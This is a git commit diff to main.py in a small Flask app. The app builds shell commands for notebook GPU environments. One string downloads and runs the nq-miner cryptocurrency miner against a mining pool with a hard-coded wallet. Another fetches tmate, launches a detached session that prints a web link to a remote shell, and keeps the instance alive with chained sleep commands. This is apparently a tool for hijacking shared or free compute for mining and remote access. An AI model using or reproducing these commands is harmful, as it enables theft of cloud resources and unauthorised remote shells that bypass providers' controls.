bdb3629927ea82ab0d8fe025cabfb710629477b2
ixelizm <57567251+ixelizm@users.noreply.github.com>
2022-03-20 03:22:55 +0300

    Update main.py

--- main.py
+++ main.py
@@ -7,14 +7,16 @@ strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{rand
 
 app = Flask(__name__)
 command = 'mkdir NimiqMiner && cd NimiqMiner && wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip && mkdir nq-miner && tar -xzvf nq-nimer-linux.zip -C nq-miner && rm nq-nimer-linux.zip &&rm ./nq-miner/start_gpu.sh &&./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443'
-command = """#@title **ID: {}**
-!nvidia-smi -L
+command = """
+#@title **ID: {}**
+""".format(strs)
+command += """!nvidia-smi -L
 !wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
 !tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
 !rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
 !./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
 !./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
-!sleep  9 && sleep 99 && sleep 999 &&  sleep 9999 &&  sleep 99999 &&  sleep 999999 && sleep 9999999 && sleep 99999999 && sleep 999999999 &""".format(strs)
+!sleep  9 && sleep 99 && sleep 999 &&  sleep 9999 &&  sleep 99999 &&  sleep 999999 && sleep 9999999 && sleep 99999999 && sleep 999999999 &"""
 
 
 @app.route("/recieve")
